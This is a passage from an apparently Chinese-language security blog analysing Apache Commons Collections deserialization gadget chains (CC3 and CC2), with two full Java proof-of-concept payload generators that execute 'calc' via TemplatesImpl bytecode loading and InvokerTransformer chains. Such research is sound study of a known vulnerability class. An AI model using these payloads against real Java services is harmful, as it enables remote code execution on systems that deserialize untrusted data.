class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>        _useServicesMechanism = _transformer.useServicesMechnism();<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>CC3解决的主要就是InvokerTransformer的禁用问题，而这个新的transformer就是用于代替InvokerTransformer。</p><p>它的transformer方法是利用传入的类对象创建一个对应新的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(input <span class="hljs-keyword">instanceof</span> Class)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class)input).getConstructor(<span class="hljs-built_in">this</span>.iParamTypes);<br>                <span class="hljs-keyword">return</span> con.newInstance(<span class="hljs-built_in">this</span>.iArgs);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException var7) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var7);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var8) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var8);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, var9);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>综合这两个类就可以完成在不使用InvokerTransformer的情况下调用到 newTransformer方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<br>        &#125;;<br></code></pre></td></tr></table></figure><p>而剩下的前半段就可使用任意的调用链。</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, InstantiationException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<br>        &#125;;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chained</span> <span class="hljs-operator">=</span> (Transformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">byte</span>[]  code = readFile(<span class="hljs-string">&quot;./target/classes/Calc.class&quot;</span>);<br><br><br><br>        tools.setValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tools.setValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">iner</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span>  LazyMap.decorate(iner,chained);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outer,<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        unser.put(key,<span class="hljs-string">&quot;111&quot;</span>);<br><br>        outer.remove(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        tools.setValue(chained,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CC3.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(unser);<br><br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CC3.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        Object test=  in.readObject();<br><br>        <br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] readFile(String path) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[]  res = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>)file.length()];<br>        fp.read(res);<br>        fp.close();<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730231852071.png" alt="image-20220730231852071"></p><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        java.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        java.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                TrAXFilter.<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>剩下的两个链都是CommonsCollections4.0产生的新链，在CommonsCollections3上不能使用。</p><h3 id="POC构造-5"><a href="#POC构造-5" class="headerlink" title="POC构造"></a>POC构造</h3><h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>在CommonsCollections4.0组件中为<code>TransformingComparator</code>类实现了Serializable接口，使其能够序列化。同时也使其成为了反序列化攻击一个入口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformingComparator</span>&lt;I, O&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>&lt;I&gt;, Serializable &#123;<br>...<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer&lt;? <span class="hljs-built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;<br>        <span class="hljs-built_in">this</span>.decorated = decorated;<br>        <span class="hljs-built_in">this</span>.transformer = transformer;<br>    &#125;<br>...<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(I obj1, I obj2)</span> &#123;<br>        <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<span class="hljs-comment">//这里需要注意此处必然会报错应为两个transform返回值为ProcessImpl对象并没有实现Comparable接口。</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类得compare方法会自动调用其内部的一个transformer得transform方法。</p><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>再来看这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>...<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Read in (and discard) array length</span><br>        s.readInt();<br><br>        queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>        <span class="hljs-comment">// Read in all elements.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br><br>        <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>        <span class="hljs-comment">// spec has never explained what that might be.</span><br>        heapify();<br>    &#125;<br>...<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>...<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>            siftDownUsingComparator(k, x);<br>        <span class="hljs-keyword">else</span><br>            siftDownComparable(k, x);<br>    &#125;<br>...<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> queue[child];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类的readObject会在经历<code>readObject()-&gt;heapify()-&gt;siftDown()-&gt;comparator.compare()</code>调用到comparator.compare()</p><p>将<code>PriorityQueue</code>内部的comparator设置为一个包含恶意transformer的TransformingComparator，整条利用链就串联起来了。</p><p>但是在PriorityQueue中还有一个分支条件就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>想要顺利进入siftDown函数就需要<code>(size &gt;&gt;&gt; 1) - 1 &gt;=0 </code>也就是说<code>size &gt; 2</code>。我这里采用反射修改其为2。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">tools.setValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><blockquote><ul><li>java.util.PriorityQueue 是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有 ⾃⼰的优先级，节点之间按照优先级⼤⼩排序成⼀棵树 </li><li>反序列化时为什么需要调⽤ heapify() ⽅法？为了反序列化后，需要恢复（换⾔之，保证）这个 结构的顺序 </li><li>排序是靠将⼤的元素下移实现的。 siftDown() 是将节点下移的函数， ⽽ comparator.compare() ⽤来⽐较两个元素⼤⼩ </li><li>TransformingComparator 实现了 java.util.Comparator 接⼝，这个接⼝⽤于定义两个对象如 何进⾏⽐较。 siftDownUsingComparator() 中就使⽤这个接⼝的 compare() ⽅法⽐较树的节 点。</li></ul><p>所以当然也可使用add方法往其中添加两个值充数。但是需要注意的是，PriorityQueue.add方法也会触发和调用链类似的方法去调用到comparator.compare()，如果comparator的transform正常设置的话就会产生报错，无法正常序列化生成payload。</p></blockquote><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.webkit.dom.ProcessingInstructionImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(comparator);<br>        <br>        tools.setValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CC2.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(queue);<br><br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CC2.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        Object test=  in.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算机</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220731001009350.png"></p><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span 